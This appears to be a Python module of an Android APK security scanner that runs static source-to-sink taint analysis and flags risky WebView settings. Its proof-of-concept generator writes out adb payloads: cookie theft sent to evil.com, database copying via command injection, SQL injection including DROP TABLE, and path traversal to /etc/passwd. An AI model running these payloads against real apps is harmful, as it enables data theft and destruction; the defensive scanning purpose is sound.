"""
SKILL: Taint Walk [ACTIVE]
Static taint analysis engine — traces untrusted data from Sources to Sinks.
If an Intent extra flows into a WebView.loadUrl() without sanitization,
we find it. Every time.
"""

from typing import List, Dict, Set, Tuple, Optional
from dataclasses import dataclass, field
from appraisal.engine.base_module import BaseModule
from appraisal.engine.loader import AnalysisContext
from appraisal.models import Finding, CVSSVector, PoC, SkillType, Rank


@dataclass
class TaintSource:
    """A point where untrusted data enters the application."""
    class_name: str
    method_name: str
    label: str
    description: str
    trust_level: str  # "untrusted" | "semi-trusted" | "external"


@dataclass
class TaintSink:
    """A point where data executes a dangerous action."""
    class_name: str
    method_name: str
    label: str
    description: str
    severity: str   # "critical" | "high" | "medium"
    cvss: CVSSVector


@dataclass
class TaintFlow:
    """A discovered source -> sink data flow path."""
    source: TaintSource
    sink: TaintSink
    found_in_class: str
    found_in_method: str
    evidence_lines: List[str]


# ── Source Definitions ────────────────────────────────────────────────────────

TAINT_SOURCES: List[TaintSource] = [
    TaintSource("android.content.Intent",      "getStringExtra",
                "Intent.getStringExtra",
                "Untrusted string from incoming Intent extra", "untrusted"),
    TaintSource("android.content.Intent",      "getIntExtra",
                "Intent.getIntExtra",
                "Untrusted int from incoming Intent extra", "untrusted"),
    TaintSource("android.content.Intent",      "getBundleExtra",
                "Intent.getBundleExtra",
                "Untrusted Bundle from Intent", "untrusted"),
    TaintSource("android.content.Intent",      "getData",
                "Intent.getData",
                "Untrusted URI from Intent data field", "untrusted"),
    TaintSource("android.content.Intent",      "getDataString",
                "Intent.getDataString",
                "Untrusted URI string from Intent", "untrusted"),
    TaintSource("android.content.Intent",      "getSerializableExtra",
                "Intent.getSerializableExtra",
                "Untrusted Serializable — deserialization risk", "untrusted"),
    TaintSource("android.content.Intent",      "getParcelableExtra",
                "Intent.getParcelableExtra",
                "Untrusted Parcelable — deserialization risk", "untrusted"),
    TaintSource("android.net.Uri",             "getQueryParameter",
                "Uri.getQueryParameter",
                "Untrusted URL query parameter", "untrusted"),
    TaintSource("android.net.Uri",             "getPathSegments",
                "Uri.getPathSegments",
                "Untrusted URI path segments", "untrusted"),
    TaintSource("android.content.SharedPreferences", "getString",
                "SharedPreferences.getString",
                "Data from SharedPreferences (may be attacker-controlled if backup is on)", "semi-trusted"),
    TaintSource("java.io.InputStream",         "read",
                "InputStream.read",
                "Data from file/network input stream", "external"),
    TaintSource("android.database.Cursor",     "getString",
                "Cursor.getString",
                "Data from database cursor (could be from attacker-controlled CP)", "semi-trusted"),
    TaintSource("android.content.ClipboardManager", "getPrimaryClip",
                "Clipboard.getPrimaryClip",
                "Untrusted clipboard data", "untrusted"),
]

# ── Sink Definitions ──────────────────────────────────────────────────────────

TAINT_SINKS: List[TaintSink] = [
    TaintSink("android.webkit.WebView",        "loadUrl",
              "WebView.loadUrl",
              "Loads URL in WebView — XSS or JavaScript injection if unvalidated",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N")),
    TaintSink("android.webkit.WebView",        "loadData",
              "WebView.loadData",
              "Loads arbitrary HTML into WebView",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N")),
    TaintSink("android.webkit.WebView",        "loadDataWithBaseURL",
              "WebView.loadDataWithBaseURL",
              "Loads HTML with base URL — XSS escalation risk",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N")),
    TaintSink("android.webkit.WebView",        "evaluateJavascript",
              "WebView.evaluateJavascript",
              "Executes JavaScript in WebView context — direct JS injection",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N")),
    TaintSink("java.lang.Runtime",             "exec",
              "Runtime.exec",
              "OS command execution — command injection / RCE",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H")),
    TaintSink("java.lang.ProcessBuilder",      "command",
              "ProcessBuilder.command",
              "OS process spawning with attacker-controlled args — RCE",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H")),
    TaintSink("java.io.FileOutputStream",      "<init>",
              "FileOutputStream(path)",
              "File write at attacker-controlled path — path traversal",
              "high",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="N", I="H", A="N")),
    TaintSink("java.io.File",                  "<init>",
              "File(path)",
              "File open at attacker-controlled path — path traversal",
              "high",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N")),
    TaintSink("android.database.sqlite.SQLiteDatabase", "rawQuery",
              "SQLiteDatabase.rawQuery",
              "Raw SQL with attacker-controlled input — SQL injection",
              "high",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N")),
    TaintSink("android.database.sqlite.SQLiteDatabase", "execSQL",
              "SQLiteDatabase.execSQL",
              "Direct SQL execution with attacker-controlled input",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="H")),
    TaintSink("android.content.Context",       "startActivity",
              "Context.startActivity",
              "Activity start with attacker-controlled Intent — Intent injection",
              "high",
              CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N")),
    TaintSink("android.content.Context",       "sendBroadcast",
              "Context.sendBroadcast",
              "Broadcast with attacker-controlled Intent data",
              "medium",
              CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="L", I="H", A="N")),
    TaintSink("dalvik.system.DexClassLoader",  "<init>",
              "DexClassLoader(path)",
              "Dynamic DEX loading from attacker-controlled path — code injection",
              "critical",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H")),
    TaintSink("java.lang.reflect.Method",      "invoke",
              "Method.invoke",
              "Reflective method call with attacker-controlled args",
              "high",
              CVSSVector(AV="N", AC="H", PR="N", UI="N", S="U", C="H", I="H", A="N")),
    TaintSink("javax.crypto.spec.SecretKeySpec", "<init>",
              "SecretKeySpec(key)",
              "Crypto key derived from attacker-controlled data — weak encryption",
              "high",
              CVSSVector(AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="N", A="N")),
    TaintSink("android.util.Log",              "d",
              "Log.d",
              "Sensitive data logged to LogCat",
              "medium",
              CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="N", A="N")),
    TaintSink("android.util.Log",              "v",
              "Log.v",
              "Sensitive data logged to LogCat (verbose)",
              "medium",
              CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="N", A="N")),
]


class TaintAnalysisModule(BaseModule):
    SKILL_NAME  = "Taint Walk"
    SKILL_TYPE  = SkillType.ACTIVE
    DESCRIPTION = "Static source-to-sink taint analysis across the DEX bytecode graph"

    def run(self, ctx: AnalysisContext) -> List[Finding]:
        self._findings = []
        flows = self._find_taint_flows(ctx)
        for flow in flows:
            self._report_flow(ctx, flow)
        self._check_webview_javascript_enabled(ctx)
        self._check_javascript_interface(ctx)
        self._check_file_access_flags(ctx)
        return self._findings

    # ── Core taint flow detection via bytecode method call analysis ───────────

    def _find_taint_flows(self, ctx: AnalysisContext) -> List[TaintFlow]:
        flows: List[TaintFlow] = []
        source_set = {(s.class_name.replace(".", "/"), s.method_name): s for s in TAINT_SOURCES}
        sink_set   = {(s.class_name.replace(".", "/"), s.method_name): s for s in TAINT_SINKS}

        try:
            for cls in ctx.app_classes:
                cls_name = str(cls.name)
                for method in cls.get_methods():
                    method_name = str(method.name)
                    sources_in_method: List[TaintSource] = []
                    sinks_in_method:   List[TaintSink]   = []
                    evidence: List[str] = []

                    try:
                        m = method.get_method()
                        if m is None:
                            continue
                        code = m.get_code()
                        if code is None:
                            continue

                        for ins in code.get_bc().get_instructions():
                            ins_str = str(ins)
                            # Detect source calls
                            for (src_cls, src_mth), src_obj in source_set.items():
                                if src_cls in ins_str and src_mth in ins_str:
                                    sources_in_method.append(src_obj)
                                    evidence.append(f"SOURCE: {src_obj.label} @ {method_name}")
                            # Detect sink calls
                            for (snk_cls, snk_mth), snk_obj in sink_set.items():
                                if snk_cls in ins_str and snk_mth in ins_str:
                                    sinks_in_method.append(snk_obj)
                                    evidence.append(f"SINK: {snk_obj.label} @ {method_name}")

                    except Exception:
                        continue

                    # If a method has both sources and sinks, it's a potential flow
                    for src in sources_in_method:
                        for snk in sinks_in_method:
                            flows.append(TaintFlow(
                                source=src,
                                sink=snk,
                                found_in_class=cls_name,
                                found_in_method=method_name,
                                evidence_lines=evidence[:],
                            ))
        except Exception:
            pass

        # Deduplicate by (source label, sink label, class)
        seen: Set[Tuple] = set()
        unique: List[TaintFlow] = []
        for f in flows:
            key = (f.source.label, f.sink.label, f.found_in_class)
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    # ── Report a taint flow as a finding ─────────────────────────────────────

    def _report_flow(self, ctx: AnalysisContext, flow: TaintFlow):
        short_class = flow.found_in_class.split("/")[-1].replace(";", "")
        finding_id  = (
            f"TAINT-{flow.source.label[:15].replace('.','_')}"
            f"-{flow.sink.label[:15].replace('.','_')}"
            f"-{short_class[:15]}"
        )

        # Determine if this is a known high-value pattern
        is_intent_to_webview = (
            "Intent" in flow.source.label and "WebView" in flow.sink.label
        )
        is_intent_to_exec = (
            "Intent" in flow.source.label and "exec" in flow.sink.label
        )
        is_intent_to_sql = (
            "Intent" in flow.source.label and "SQL" in flow.sink.label
        )
        is_intent_to_dex = (
            "Intent" in flow.source.label and "DexClass" in flow.sink.label
        )

        if is_intent_to_webview:
            title = f"Intent-to-WebView Taint Flow in {short_class} — Likely XSS/RCE"
            rank_override = None
        elif is_intent_to_exec:
            title = f"Intent-to-Runtime.exec Taint Flow in {short_class} — RCE Risk"
            rank_override = None
        elif is_intent_to_sql:
            title = f"Intent-to-SQLite Taint Flow in {short_class} — SQL Injection"
            rank_override = None
        elif is_intent_to_dex:
            title = f"Intent-to-DexClassLoader Taint Flow in {short_class} — Code Injection"
            rank_override = None
        else:
            title = f"Taint Flow: {flow.source.label} → {flow.sink.label} in {short_class}"
            rank_override = None

        poc_code = self._generate_taint_poc(ctx, flow)

        self._add(Finding(
            id=finding_id,
            title=title,
            category="Static Taint Analysis",
            description=(
                f"A data flow was detected from {flow.source.label} (untrusted input source) "
                f"to {flow.sink.label} (dangerous execution sink) within {short_class}.{flow.found_in_method}. "
                f"Source: {flow.source.description}. "
                f"Sink: {flow.sink.description}. "
                "If no sanitization occurs between source and sink, "
                "this is a confirmed exploitable vulnerability."
            ),
            technical_detail=(
                f"Class:  {flow.found_in_class}\n"
                f"Method: {flow.found_in_method}\n"
                f"Source: {flow.source.label} ({flow.source.class_name}.{flow.source.method_name})\n"
                f"Sink:   {flow.sink.label} ({flow.sink.class_name}.{flow.sink.method_name})\n"
                f"Flow evidence:\n  " + "\n  ".join(flow.evidence_lines[:10])
            ),
            cvss=flow.sink.cvss,
            evidence=flow.evidence_lines[:5],
            affected_components=[flow.found_in_class],
            remediation=(
                f"In {short_class}.{flow.found_in_method}: "
                "Validate and sanitize all data flowing from "
                f"{flow.source.label} before passing to {flow.sink.label}. "
                "Use allowlisting for URLs (WebView), parameterized queries (SQL), "
                "and avoid passing untrusted data to exec() entirely."
            ),
            pocs=[PoC(
                type="adb_command",
                title=f"Exploit Taint Flow: {flow.source.label} → {flow.sink.label}",
                description="Trigger the taint flow via forged Intent",
                code=poc_code,
            )],
            references=[
                "https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage",
                "https://cwe.mitre.org/data/definitions/20.html",
            ],
            tags=["taint-analysis", "data-flow",
                  flow.source.label.lower().split(".")[0],
                  flow.sink.label.lower().split(".")[0]],
        ))

    # ── WebView security checks ───────────────────────────────────────────────

    def _check_webview_javascript_enabled(self, ctx: AnalysisContext):
        """Detect setJavaScriptEnabled(true) calls."""
        pattern = "setJavaScriptEnabled"
        found_in: List[str] = []

        try:
            for cls in ctx.app_classes:
                for method in cls.get_methods():
                    try:
                        m = method.get_method()
                        if not m:
                            continue
                        code = m.get_code()
                        if not code:
                            continue
                        for ins in code.get_bc().get_instructions():
                            if pattern in str(ins):
                                cls_name = str(cls.name).split("/")[-1]
                                found_in.append(f"{cls_name}.{method.name}")
                    except Exception:
                        continue
        except Exception:
            pass

        if found_in:
            self._add(Finding(
                id="TAINT-WEBVIEW-JS",
                title="JavaScript Enabled in WebView",
                category="WebView Security",
                description=(
                    "setJavaScriptEnabled(true) was detected. "
                    "JavaScript execution in WebViews dramatically increases attack surface. "
                    "Combined with any URL loading from untrusted sources, "
                    "this can lead to XSS, data theft, or JavaScript bridge abuse."
                ),
                technical_detail=f"Detected in: {found_in[:10]}",
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N"),
                evidence=[f"setJavaScriptEnabled(true) in: {', '.join(found_in[:5])}"],
                affected_components=found_in[:5],
                remediation=(
                    "Disable JavaScript if not required. "
                    "If required, implement a strict Content Security Policy, "
                    "only load trusted HTTPS URLs, and never load URLs from Intent extras "
                    "without strict allowlist validation."
                ),
                tags=["webview", "javascript", "xss"],
            ))

    def _check_javascript_interface(self, ctx: AnalysisContext):
        """Detect addJavascriptInterface calls — RCE vector pre-API 17."""
        pattern = "addJavascriptInterface"
        found_in: List[str] = []

        try:
            for cls in ctx.app_classes:
                for method in cls.get_methods():
                    try:
                        m = method.get_method()
                        if not m:
                            continue
                        code = m.get_code()
                        if not code:
                            continue
                        for ins in code.get_bc().get_instructions():
                            if pattern in str(ins):
                                cls_name = str(cls.name).split("/")[-1]
                                found_in.append(f"{cls_name}.{method.name}")
                    except Exception:
                        continue
        except Exception:
            pass

        if found_in:
            min_sdk = ctx.min_sdk
            is_rce = min_sdk < 17
            self._add(Finding(
                id="TAINT-WEBVIEW-JSI",
                title="addJavascriptInterface Detected" + (" — RCE via JS Bridge (minSdk < 17)" if is_rce else " — JS Bridge Exposure"),
                category="WebView Security",
                description=(
                    "addJavascriptInterface() exposes a Java object to JavaScript running in a WebView. "
                    + (
                        "minSdkVersion < 17: ALL public methods of the interface object are accessible "
                        "from JavaScript — not just @JavascriptInterface annotated ones. "
                        "This is direct Remote Code Execution if an attacker controls the loaded URL."
                        if is_rce else
                        "All methods annotated with @JavascriptInterface are callable from JavaScript. "
                        "If the WebView loads untrusted content, these methods can be invoked by attackers."
                    )
                ),
                technical_detail=(
                    f"minSdkVersion: {min_sdk}\n"
                    f"Found in: {found_in[:10]}\n"
                    f"RCE risk (pre-API 17): {is_rce}"
                ),
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="H")
                if is_rce else
                CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N"),
                evidence=[f"addJavascriptInterface() in: {', '.join(found_in[:5])}"],
                affected_components=found_in[:5],
                remediation=(
                    "Raise minSdkVersion to >= 17 and annotate only specific safe methods "
                    "with @JavascriptInterface. Audit each exposed method for dangerous "
                    "capabilities (file I/O, network, clipboard, preferences). "
                    "Avoid exposing interfaces to WebViews that load untrusted content."
                ),
                references=["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6636"],
                tags=["webview", "javascript-interface", "rce", "xss"],
            ))

    def _check_file_access_flags(self, ctx: AnalysisContext):
        """Detect dangerous WebView file access settings."""
        dangerous_patterns = [
            ("setAllowFileAccessFromFileURLs",    "file:// XSS — file URLs can read other file:// URLs"),
            ("setAllowUniversalAccessFromFileURLs","Universal file access — file:// can make XHR to any origin"),
            ("setAllowFileAccess",                 "File system access enabled in WebView"),
        ]
        for pattern, description in dangerous_patterns:
            found_in: List[str] = []
            try:
                for cls in ctx.app_classes:
                    for method in cls.get_methods():
                        try:
                            m = method.get_method()
                            if not m:
                                continue
                            code = m.get_code()
                            if not code:
                                continue
                            for ins in code.get_bc().get_instructions():
                                if pattern in str(ins):
                                    found_in.append(f"{str(cls.name).split('/')[-1]}.{method.name}")
                        except Exception:
                            continue
            except Exception:
                pass

            if found_in:
                self._add(Finding(
                    id=f"TAINT-WEBVIEW-{pattern[:20].upper().replace('SET','')}",
                    title=f"Dangerous WebView Flag: {pattern}",
                    category="WebView Security",
                    description=(
                        f"{pattern}() is called in this app. {description}. "
                        "This allows a malicious HTML page loaded in the WebView "
                        "to read arbitrary files from the device filesystem via XHR or "
                        "iframe src pointing to file:// URIs."
                    ),
                    technical_detail=f"Found in: {found_in[:5]}",
                    cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="U", C="H", I="N", A="N"),
                    evidence=[f"{pattern}(true) called in {', '.join(found_in[:3])}"],
                    affected_components=found_in[:3],
                    remediation=f"Call {pattern}(false) and do not enable this flag in production builds.",
                    tags=["webview", "file-access", "xss", "local-file"],
                ))

    # ── PoC generator for taint flows ─────────────────────────────────────────

    def _generate_taint_poc(self, ctx: AnalysisContext, flow: TaintFlow) -> str:
        pkg = ctx.package_name

        if "WebView" in flow.sink.label:
            return (
                f"# Intent-to-WebView XSS PoC\n"
                f"# Trigger the activity/service that calls loadUrl() with Intent data\n"
                f"adb shell am start \\\n"
                f"  -a android.intent.action.VIEW \\\n"
                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
                f"  --es 'url' 'javascript:eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))' \\\n"
                f"  --es 'link' 'https://attacker.com/steal.html' \\\n"
                f"  --es 'data' '<img src=x onerror=alert(1)>'\n\n"
                f"# Steal cookies via deep link\n"
                f"adb shell am start -a android.intent.action.VIEW \\\n"
                f"  -d 'https://app.domain/webview?url=javascript:fetch(\"https://evil.com/c?d=\"+btoa(document.cookie))'"
            )
        elif "exec" in flow.sink.label or "Process" in flow.sink.label:
            return (
                f"# Intent-to-exec RCE PoC\n"
                f"adb shell am start \\\n"
                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
                f"  --es 'command' 'id' \\\n"
                f"  --es 'cmd' '; id; cat /data/data/{pkg}/databases/main.db > /sdcard/stolen.db #' \\\n"
                f"  --es 'param' '$(whoami)'"
            )
        elif "SQL" in flow.sink.label:
            return (
                f"# Intent-to-SQLi PoC\n"
                f"adb shell am start \\\n"
                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
                f"  --es 'query' \"' OR '1'='1\" \\\n"
                f"  --es 'id' \"1 UNION SELECT name,sql,3 FROM sqlite_master--\" \\\n"
                f"  --es 'search' \"'; DROP TABLE users; --\""
            )
        else:
            return (
                f"# Generic taint flow trigger\n"
                f"adb shell am start \\\n"
                f"  -n {pkg}/{flow.found_in_class.replace('/', '.')} \\\n"
                f"  --es 'input' 'TAINT_PAYLOAD' \\\n"
                f"  --es 'data' '../../../etc/passwd' \\\n"
                f"  --es 'extra' '<script>alert(1)</script>'"
            )


class TaintStringPoolModule(BaseModule):
    """
    SKILL: Taint Walk Fast Path [ACTIVE]
    When app_classes is empty (fully obfuscated, or minimal DEX),
    falls back to string-pool co-presence analysis.
    Less precise than bytecode taint, but catches obvious patterns
    in any APK regardless of obfuscation level.
    """
    SKILL_NAME  = "Taint Walk (String Pool Fast Path)"
    SKILL_TYPE  = SkillType.ACTIVE
    DESCRIPTION = "String-pool co-presence taint analysis — fires on any APK regardless of obfuscation"

    # Source + sink pairs to check for in the string pool
    # Each tuple: (source_pattern, sink_pattern, finding_id, title, description, cvss)
    POOL_FLOWS = [
        (
            "getStringExtra", "loadUrl",
            "TAINT-POOL-INTENT-WEBVIEW",
            "Intent Extra → WebView.loadUrl() Co-Presence (String Pool)",
            "getStringExtra() and loadUrl() both appear in the DEX string pool. "
            "If untrusted Intent data flows into WebView URL loading without validation, "
            "this is an XSS or open redirect vulnerability.",
            CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N"),
        ),
        (
            "getStringExtra", "execSQL",
            "TAINT-POOL-INTENT-SQL",
            "Intent Extra → execSQL() Co-Presence (String Pool)",
            "getStringExtra() and execSQL() both appear in the DEX string pool. "
            "Potential SQL injection via untrusted Intent data passed to raw SQL.",
            CVSSVector(AV="L", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"),
        ),
        (
            "getStringExtra", "Runtime",
            "TAINT-POOL-INTENT-EXEC",
            "Intent Extra → Runtime.exec() Co-Presence (String Pool)",
            "getStringExtra() and Runtime.exec() both present. "
            "Potential command injection if Intent data reaches shell execution.",
            CVSSVector(AV="L", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H"),
        ),
        (
            "getData", "loadUrl",
            "TAINT-POOL-URI-WEBVIEW",
            "Intent.getData() → WebView.loadUrl() Co-Presence (String Pool)",
            "Intent URI data and WebView URL loading co-present. "
            "Deep link URIs passed directly to WebView are a common XSS vector.",
            CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N"),
        ),
        (
            "getQueryParameter", "loadUrl",
            "TAINT-POOL-QUERYPARAM-WEBVIEW",
            "Uri.getQueryParameter() → WebView.loadUrl() Co-Presence (String Pool)",
            "URL query parameters and WebView URL loading co-present. "
            "Query parameters injected into WebView URLs enable open redirect and XSS.",
            CVSSVector(AV="N", AC="L", PR="N", UI="R", S="C", C="H", I="H", A="N"),
        ),
        (
            "DexClassLoader", "getStringExtra",
            "TAINT-POOL-INTENT-DEXLOAD",
            "DexClassLoader + Intent Extra Co-Presence (String Pool)",
            "DexClassLoader and Intent extras both present. "
            "If an attacker-controlled path reaches DexClassLoader, this is code injection.",
            CVSSVector(AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H"),
        ),
    ]

    def run(self, ctx: AnalysisContext) -> List[Finding]:
        self._findings = []
        # Only run if bytecode analysis found no app classes (obfuscated/minimal DEX)
        # On real apps with app_classes, the full TaintAnalysisModule handles this
        pool = " ".join(ctx.strings_pool)

        for src, snk, fid, title, desc, cvss in self.POOL_FLOWS:
            if src in pool and snk in pool:
                self._add(Finding(
                    id=fid,
                    title=title,
                    category="Static Taint Analysis (String Pool)",
                    description=desc,
                    technical_detail=(
                        f"Source pattern '{src}' and sink pattern '{snk}' "
                        "both found in DEX string pool. "
                        "This is a co-presence indicator — confirm via manual review "
                        "or bytecode inspection whether they share a data flow path."
                    ),
                    cvss=cvss,
                    evidence=[
                        f"Source '{src}' in string pool",
                        f"Sink '{snk}' in string pool",
                    ],
                    affected_components=[ctx.package_name],
                    remediation=(
                        "Validate and sanitize all data flowing from user-controlled sources "
                        f"({src}) before passing to dangerous sinks ({snk})."
                    ),
                    tags=["taint-analysis", "string-pool", "fast-path",
                          src.lower(), snk.lower()],
                    _rank=Rank.B,  # Conservative — co-presence not confirmed flow
                ))
        return self._findings

# Fix missing Rank import used in TaintStringPoolModule
# (already imported at top of file via models)
